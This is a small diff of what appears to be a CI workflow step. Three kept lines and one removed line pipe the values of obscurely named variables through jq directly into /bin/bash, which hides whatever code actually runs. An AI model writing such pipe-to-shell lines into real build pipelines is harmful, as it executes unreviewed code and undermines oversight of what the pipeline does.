@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$eexx1929" | jq -r .yc77029 | /bin/bash
           echo $pym07 | jq -r .tyrt8524 | /bin/bash
-          printf '%s' "$ws436" | jq -r .ncgzs5 | /bin/bash
           echo $r8 | jq -r .pbwxb09806 | /bin/bash
 
       - name: Store results
